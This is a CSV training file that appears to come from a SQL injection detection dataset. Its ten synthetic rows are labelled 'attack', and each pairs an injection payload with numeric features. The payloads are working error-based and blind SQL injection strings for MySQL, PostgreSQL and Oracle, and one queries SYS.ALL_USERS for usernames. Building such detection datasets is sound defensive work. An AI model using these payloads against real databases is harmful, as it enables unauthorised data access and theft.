id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000229,0.7600844183456723,218.74899912648303,30.59362489081038,3.8573728821309348,72.78087467243114,45.0,78.37449956324151,22.59362489081038,0.33266818858025127,0.2059385420420208,0.35813122659327457,0.10326204278445336,0.0,0.2968124454051891,2.0,0.0,5.551115123125783e-17,2.0,0.0,13.29681244540519,0.0,0.0,5.0,4.0,0.0,0.29681244540518903,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000002,attack,error,-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,nearest_attack_euclidean,R000118,0.8804548402400556,396.601248399358,34.377738146052124,3.4458579643284843,94.73357112368723,57.86678556184361,178.88958244408775,65.11130926973937,0.23911166330653794,0.14616655562123823,0.4505206344967986,0.16420114657542528,0.0,0.0,1.0,0.0,5.551115123125783e-17,3.0,0.0,36.48904741579149,0.0,2.0666072190781914,0.0,25.86678556184362,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.3111309269739362,0.0,0.0,1.3111309269739362,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.622261853947872
SMOTE_000003,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000155,0.5378203184610292,340.38871117939743,33.26645341527695,3.325610648438958,77.63322670763847,47.63322670763847,157.244515528241,57.877742235879495,0.2280635633580481,0.13992696699739599,0.4619759124071776,0.17003355723737829,0.0,0.0,0.8777422358794913,0.0,5.551115123125783e-17,2.0,0.0,32.122257764120505,0.0,0.0,0.0,22.87774223587949,0.0,0.0,0.0,0.8777422358794913,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.1222577641205087,0.8777422358794913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000004,attack,error,"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,nearest_attack_euclidean,R000234,1.1167394222530602,308.88637431483636,39.0,4.025873882439197,104.51516575311513,55.0,113.0,36.37120856172122,0.33828085571066,0.17807338265481681,0.36585985890898726,0.1177859027255359,0.0,3.9999999999999996,0.0,0.0,2.0,2.0,0.0,20.0,1.3712085617212204,0.0,6.0,5.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000005,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",nearest_attack_euclidean,R000129,0.05514361311602352,161.60586136521005,28.939413863478997,3.8614426916451565,51.0,35.0,55.484689092168026,20.121172273042006,0.31564785406902357,0.21662107632187894,0.3432389876412953,0.1244920819678022,0.0,3.9999999999999996,0.0,0.0,5.551115123125783e-17,1.0,0.0,10.121172273042008,0.0,0.0,5.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000006,attack,error,"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000144,0.7952058559983467,322.1723071401133,38.64653839251416,3.9960709258839513,105.26288437379955,63.0,119.58615357005664,34.32326919625708,0.3266697616644669,0.19565127888304265,0.37111860200561475,0.10656035744687567,0.0,0.0,2.0,0.0,2.0,2.0,0.0,21.32326919625708,0.0,0.0,6.0,7.0,0.0,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.3232691962570785,0.6767308037429214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000007,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000099,0.48869717593049794,164.159375006108,29.0,3.7701021801897743,40.36953125458099,43.84062499389201,59.73906250916198,20.210156248473,0.24586630083777286,0.2671880293141178,0.36379534871594726,0.12315032113216208,0.21015624847300263,0.0,2.0,0.0,5.551115123125783e-17,2.0,0.0,10.789843751526996,0.0,0.0,5.210156248473003,4.0,0.21015624847300274,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000199,1.2116847850891383,178.37113489172648,31.0,3.656640173365875,48.0,35.01649676179826,72.62886510827352,22.725773021654703,0.2691434011671053,0.1960030921432621,0.40739570193632124,0.1274578047533114,0.0,0.2742269783452965,2.0,0.0,0.7257730216547034,1.2742269783452966,0.0,13.451546043309406,0.0,0.0,4.274226978345297,4.0,0.0,0.2742269783452965,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.4515460433094067,0.0,0.2742269783452965,0.7257730216547035,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.451546043309407
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000005,0.0,213.0,40.0,4.192633796617524,117.0,2.0,71.0,23.0,0.5492957746478874,0.009389671361502344,0.3333333333333333,0.107981220657277,3.0,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,10.0,0.0,4.0,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000010,attack,error,"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",nearest_attack_euclidean,R000138,1.4973162280356145,186.22711849549034,36.0,3.9360316377807223,63.056779623872586,31.685593207957528,69.42796603978763,22.056779623872586,0.3386828073573155,0.17022456882484446,0.37277315595446003,0.11831946786338005,1.3711864159150564,0.3144067920424718,0.0,0.0,5.551115123125783e-17,1.0,0.0,13.685593207957528,0.0,0.0,4.0,2.371186415915056,0.6855932079575282,0.3144067920424718,0.0,0.3144067920424718,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.6855932079575282,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.685593207957528
